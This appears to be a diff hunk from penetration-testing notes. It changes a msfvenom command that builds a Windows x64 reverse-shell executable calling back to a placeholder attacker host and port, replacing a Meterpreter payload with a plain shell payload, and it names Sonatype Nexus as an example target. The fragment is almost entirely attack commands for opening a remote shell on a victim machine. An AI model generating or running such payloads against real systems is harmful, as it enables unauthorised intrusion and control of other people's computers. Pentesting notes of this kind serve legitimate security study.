@@ -314,7 +314,7 @@ On **TARGET**:
 On **LOCAL**:
 
 ```
-# msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -o <FILENAME>.exe
+# msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -o <FILENAME>.exe
 ``` 
 
 On **TARGET** ***e.g. Sonatype Nexus***:
